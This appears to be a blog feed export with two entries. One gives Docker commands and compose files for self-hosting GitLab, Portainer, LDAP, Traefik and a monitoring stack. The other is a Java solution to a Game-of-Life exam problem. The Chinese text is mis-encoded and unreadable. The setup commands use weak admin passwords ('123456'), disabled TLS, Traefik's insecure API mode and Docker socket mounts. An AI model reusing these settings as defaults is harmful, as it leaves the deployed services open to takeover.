<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure>

<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="Portainer-docs"><a href="#Portainer-docs" class="headerlink" title="Portainer [docs]"></a>Portainer [<a href="https://documentation.portainer.io/v2.0/deploy/ceinstalldocker">docs</a>]</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 9000:9000 -p 8000:8008 --name portainer \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">-v &quot;$(pwd)/portainer&quot;/data:/data \</span><br><span class="line">-d portainer/portainer-ce \</span><br><span class="line">--tunnel-port 8008 # é»˜è®¤8000</span><br></pre></td></tr></table></figure>

<h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="hoppscotch-postwoman"><a href="#hoppscotch-postwoman" class="headerlink" title="hoppscotch(postwoman)"></a>hoppscotch(postwoman)</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">docker run -p <span class="number">3000</span><span class="punctuation">:</span><span class="number">3000</span> hoppscotch/hoppscotch<span class="punctuation">:</span>latest</span><br></pre></td></tr></table></figure>

<h2 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h2><h3 id="Rocket-chat"><a href="#Rocket-chat" class="headerlink" title="Rocket.chat"></a>Rocket.chat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://raw.githubusercontent.com/RocketChat/Docker.Official.Image/master/compose.yml -O</span><br></pre></td></tr></table></figure>

<h1 id="å…¶ä»–-1"><a href="#å…¶ä»–-1" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 389:389 \</span><br><span class="line">    -v <span class="variable">$PWD</span>/ldap/ldap:/var/lib/ldap \</span><br><span class="line">    -v <span class="variable">$PWD</span>/ldap/slapd.d:/etc/ldap/slapd.d \</span><br><span class="line">    --name ldap \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_TLS=<span class="literal">false</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_ORGANISATION=<span class="string">&quot;zhaoqi&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_DOMAIN=<span class="string">&quot;zhaoqi.vip&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_ADMIN_PASSWORD=<span class="string">&quot;123456&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_CONFIG_PASSWORD=<span class="string">&quot;123456&quot;</span> \</span><br><span class="line">    --restart=always osixia/openldap</span><br></pre></td></tr></table></figure>

<h3 id="phpldapadmin"><a href="#phpldapadmin" class="headerlink" title="phpldapadmin"></a>phpldapadmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -dit -p 19999:80 \</span><br><span class="line">    --<span class="built_in">link</span> ldap \</span><br><span class="line">    --name ldap_mgr \</span><br><span class="line">    --<span class="built_in">env</span> PHPLDAPADMIN_HTTPS=<span class="literal">false</span> \</span><br><span class="line">    --<span class="built_in">env</span> PHPLDAPADMIN_LDAP_HOSTS=ldap \</span><br><span class="line">    --restart=always osixia/phpldapadmin</span><br></pre></td></tr></table></figure>

<h1 id="æ­é…Traefik"><a href="#æ­é…Traefik" class="headerlink" title="æ­é…Traefik"></a>æ­é…Traefik</h1><h2 id="Traefik"><a href="#Traefik" class="headerlink" title="Traefik"></a>Traefik</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">reverse-proxy:</span></span><br><span class="line">    <span class="comment"># The official v2 Traefik docker image</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">traefik</span></span><br><span class="line">    <span class="comment"># Enables the web UI and tells Traefik to listen to docker</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--api.insecure=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--entrypoints.http.address=:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--entrypoints.https.address=:443&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.docker=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.docker.watch=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file.watch=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file.directory=/etc/traefik/config&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment"># The HTTP port</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">      <span class="comment"># The Web UI (enabled by --api.insecure=true)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># So that Traefik can listen to the Docker events</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./traefik/ssl/:/ssl/:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./traefik/config:/etc/traefik/config</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="comment"># Frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.traefik.rule=Host(`traefik.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.traefik.loadbalancer.server.port=8080&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">portainer:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">portainer/portainer-ce:2.9.3</span></span><br><span class="line">    <span class="comment">#command: -H unix:///var/run/docker.sock</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./portainer:/data</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="comment"># Frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.frontend.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.frontend.loadbalancer.server.port=9000&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.frontend.service=frontend&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Edge</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.edge.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.edge.loadbalancer.server.port=8000&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.edge.service=edge&quot;</span></span><br><span class="line">  <span class="attr">cadvisor:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">google/cadvisor:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">cadvisor</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/:/rootfs:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run:/var/run:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/sys:/sys:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/lib/docker/:/var/lib/docker:ro</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.cadvisor.rule=Host(`cadvisor.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.cadvisor.loadbalancer.server.port=8080&quot;</span></span><br><span class="line">  <span class="attr">prometheus:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">prom/prometheus</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./prometheus:/etc/prometheus</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./prometheus/data:/prometheus</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--storage.tsdb.retention.time=30d&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.prometheus.rule=Host(`prometheus.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.prometheus.loadbalancer.server.port=9090&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;cadvisor.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;node-exporter.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">influxdb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">influxdb</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./influxdb:/var/lib/influxdb</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.influxdb.rule=Host(`influxdb.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.influxdb.loadbalancer.server.port=8086&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">grafana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">grafana/grafana</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./grafana:/var/lib/grafana</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.grafana.rule=Host(`grafana.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.grafana.loadbalancer.server.port=3000&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">node-exporter:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">prom/node-exporter</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node-exporter</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--path.rootfs=/host&#x27;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;/:/host:ro,rslave&#x27;</span></span><br><span class="line">    <span class="attr">pid:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.node-exporter.rule=Host(`node-exporter.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.node-exporter.loadbalancer.server.port=9100&quot;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>å®¹å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title>æœŸæœ«è€ƒè¯•_ç»†èƒè‡ªåŠ¨æœº</title>
    <url>/posts/6200/</url>
    <content><![CDATA[<h2 id="é¢˜ç›®å†…å®¹ï¼š"><a href="#é¢˜ç›®å†…å®¹ï¼š" class="headerlink" title="é¢˜ç›®å†…å®¹ï¼š"></a>é¢˜ç›®å†…å®¹ï¼š</h2><p>è¿™æ˜¯ç»†èƒè‡ªåŠ¨æœºçš„éå›¾å½¢ç‰ˆæœ¬ã€‚ç»†èƒè‡ªåŠ¨æœºæ˜¯æŒ‡åœ¨ä¸€ä¸ªäºŒç»´ç½‘æ ¼å†…ï¼Œæ¯ä¸€ä¸ªç½‘æ ¼æ˜¯ä¸€ä¸ªç»†èƒã€‚æ¯ä¸ªç»†èƒæœ‰æ´»å’Œæ­»ä¸¤ç§çŠ¶æ€ã€‚<br>åˆå§‹æ—¶åˆ»ï¼Œæœ‰äº›ç»†èƒæ˜¯æ´»çš„ï¼Œæœ‰äº›ç»†èƒæ˜¯æ­»çš„ã€‚è‡ªåŠ¨æœºçš„æ¯ä¸€æ­¥ï¼Œæ ¹æ®æ¯ä¸ªç»†èƒå‘¨å›´8ä¸ªæ ¼å­å†…çš„å…¶ä»–ç»†èƒçš„ç”Ÿå­˜æƒ…å†µå†³å®šè¿™ä¸ªç»†èƒä¸‹ä¸€æ­¥æ˜¯å¦å­˜æ´»ã€‚å…·ä½“çš„è§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>å¦‚æœè¯¥ç»†èƒç°åœ¨æ˜¯æ´»çš„ï¼Œå¹¶ä¸”å‘¨å›´8ä¸ªæ ¼å­ä¸­æœ‰2æˆ–3ä¸ªæ´»ç€çš„ç»†èƒï¼Œåˆ™ç»§ç»­å­˜æ´»ï¼›å¦‚æœå‘¨å›´8ä¸ªæ ¼å­ä¸­çš„æ´»ç€çš„ç»†èƒæ•°é‡å°‘äº2ä¸ªæˆ–å¤šäº3ä¸ªï¼Œåˆ™æ­»äº¡ï¼›</li>
<li>å¦‚æœè¯¥ç»†èƒç°åœ¨æ˜¯æ­»çš„ï¼Œå¹¶ä¸”å‘¨å›´8ä¸ªæ ¼å­ä¸­æ­£å¥½æœ‰3ä¸ªæ´»ç€çš„ç»†èƒï¼Œåˆ™ç»†èƒå¤æ´»ã€‚</li>
<li>ä½äºæ•´ä¸ªç½‘æ ¼è¾¹ç¼˜å’Œé¡¶è§’çš„ç»†èƒï¼Œå®ƒçš„å‘¨å›´ç»†èƒå¯èƒ½å°‘äº8ä¸ªã€‚å³è¶Šè¿‡ç½‘æ ¼çš„è¾¹ç•Œä¸å†æœ‰ç»†èƒã€‚</li>
<li>æ¯ä¸ªç»†èƒçš„ç”Ÿæ­»å˜åŒ–ï¼Œéƒ½ä¸ä¼šå½±å“å½“å‰è¿™ä¸€æ­¥å‘¨å›´çš„ç»†èƒï¼Œåªä¼šåœ¨ä¸‹ä¸€æ­¥è¡¨ç°å‡ºæ¥ã€‚</li>
</ul>
<p>æç¤ºï¼šè¯¾ç¨‹ä¸­çš„ä»£ç ä¸ä¸Šä¸€å¥æè¿°ä¸åŒã€‚</p>
<span id="more"></span>
<h2 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼:"></a>è¾“å…¥æ ¼å¼:</h2><p>é¦–å…ˆè¾“å…¥ä¸¤ä¸ªæ­£æ•´æ•°ï¼ŒèŒƒå›´ä¸º[3,102]ï¼Œä¾æ¬¡è¡¨ç¤ºç½‘æ ¼çš„å®½åº¦å’Œé«˜åº¦ã€‚<br>ç„¶åè¾“å…¥å¤šç»„æ­£æ•´æ•°ï¼Œä¾æ¬¡è¡¨ç¤ºä¸€ä¸ªæ´»ç€çš„ç»†èƒçš„ç½‘æ ¼ä½ç½®ï¼Œæ¯ç»„æ•°å­—ä¸­ï¼Œç¬¬ä¸€ä¸ªè¡¨ç¤ºè¡Œå·ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºåˆ—å·ï¼Œå‡ä»0å¼€å§‹ç¼–å·ã€‚<br>æœ€åï¼Œä»¥â€œ-1 -1â€è¡¨ç¤ºä¸å†æœ‰æ´»ç€çš„ç»†èƒã€‚-1 -1ä¸æ˜¯æœ‰æ•ˆçš„ä½ç½®ã€‚<br>ç„¶åï¼Œä»¥ä¸€ä¸ªæ­£æ•´æ•°ï¼ŒèŒƒå›´ä¸º[1,10000]ï¼Œè¡¨ç¤ºè¦æ±‚ç»†èƒè‡ªåŠ¨æœºæ‰§è¡Œçš„æ­¥æ•°ã€‚</p>
<h2 id="è¾“å‡ºæ ¼å¼ï¼š"><a href="#è¾“å‡ºæ ¼å¼ï¼š" class="headerlink" title="è¾“å‡ºæ ¼å¼ï¼š"></a>è¾“å‡ºæ ¼å¼ï¼š</h2><p>è¾“å‡ºä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºæ‰§è¡Œå®Œæ¯•åï¼Œå‰©ä¸‹çš„æ´»ç€çš„ç»†èƒçš„æ•°é‡ã€‚</p>
<h2 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h2><div class="note default no-icon"><p>3 3
1 1 1 2 0 1 2 1
-1 -1
1
</p></div>
## è¾“å‡ºæ ·ä¾‹ï¼š
<div class="note default no-icon"><p>7
</p></div>

<p><strong>æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb</strong></p>
<h2 id="ä»£ç ï¼š"><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡_Javaè¯­è¨€_ç¿æº;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">The_final_exam</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> times;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">	<span class="type">int</span> old_field[][];</span><br><span class="line">	<span class="type">int</span> new_field[][];</span><br><span class="line"></span><br><span class="line">	<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Init</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		width = in.nextInt();</span><br><span class="line">		height = in.nextInt();</span><br><span class="line">		old_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		new_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; height+<span class="number">2</span>; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">2</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//è¯»å…¥æ´»çš„ç»†èƒçš„ä½ç½®</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> i=in.nextInt();</span><br><span class="line">			<span class="type">int</span> j=in.nextInt();</span><br><span class="line">			<span class="keyword">if</span>(i==-<span class="number">1</span>&amp;&amp;j==-<span class="number">1</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			old_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">			new_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//è¯»å…¥æ‰§è¡Œæ­¥æ•°</span></span><br><span class="line">		times = in.nextInt();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;times;k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;height+<span class="number">1</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;width+<span class="number">1</span>;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">int</span> count=getNeighbor(i, j);</span><br><span class="line">					<span class="keyword">if</span>(old_field[i][j]==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(count==<span class="number">3</span>)<span class="comment">//ç»†èƒå¤æ´»</span></span><br><span class="line">							new_field[i][j]=<span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(!(count==<span class="number">2</span>||count==<span class="number">3</span>))<span class="comment">//ç»†èƒæ­»äº¡</span></span><br><span class="line">							new_field[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//copy</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					old_field[i][j] = new_field[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">getNeighbor</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//è®¡ç®—ä½ç½®ä¸ºiï¼Œjçš„ç»†èƒå‘¨å›´æ´»çš„ç»†èƒçš„æ•°é‡</span></span><br><span class="line">		<span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j]+old_field[i+<span class="number">1</span>][j]+old_field[i][j-<span class="number">1</span>]+old_field[i][j+<span class="number">1</span>];</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i-<span class="number">1</span>][j+<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Count</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//è®¡ç®—æ´»ç€çš„ç»†èƒçš„æ•°é‡</span></span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(old_field[i][j]==<span class="number">1</span>)</span><br><span class="line">					count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Init();</span><br><span class="line">		run();</span><br><span class="line">		System.out.println(Count());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">The_final_exam</span>().Test();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h2><p>ç®€å•æ¨¡æ‹Ÿé¢˜....<br>ç”¨ä¸¤ä¸ªäºŒç»´æ•°ç»„æ¥å­˜ç»†èƒï¼Œç»†èƒè‡ªåŠ¨æœºæ¯æ‰§è¡Œä¸€æ¬¡ï¼Œéå†æ•°ç»„1ä¸€æ¬¡ï¼Œå¯¹æ•°ç»„1ä¸­æ¯ä¸ªç»†èƒçš„çŠ¶æ€è¿›è¡Œåˆ¤æ–­ï¼Œè®¡ç®—å‘¨å›´æ´»ç€çš„ç»†èƒçš„æ•°é‡ï¼Œç„¶åå¯¹æ•°ç»„2è¿›è¡Œç›¸åº”çš„æ“ä½œï¼Œæ‰€æœ‰æ“ä½œå®Œæˆåå°†æ•°ç»„2æ‹·è´è‡³æ•°ç»„1ã€‚<br>è¿™é‡Œåˆ¤æ–­ç»†èƒå‘¨å›´æ´»ç€çš„ç»†èƒæ•°é‡æ—¶æœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œä¸éœ€è¦å¯¹æ¯ç§è¾¹ç•Œæƒ…å†µè¿›è¡Œå¤„ç†,å¯ä»¥å°†æ•°ç»„å¼€å¤§ç‚¹ï¼Œä¸‹æ ‡ä»1å¼€å§‹ä½¿ç”¨ï¼Œç›¸å½“äºåœ¨æ‰€ä½¿ç”¨çš„æœ‰æ•ˆæ•°ç»„ç©ºé—´å¤–é¢ç»•äº†ä¸€åœˆï¼Œé¿å…æ•°ç»„è¶Šç•Œã€‚</p>
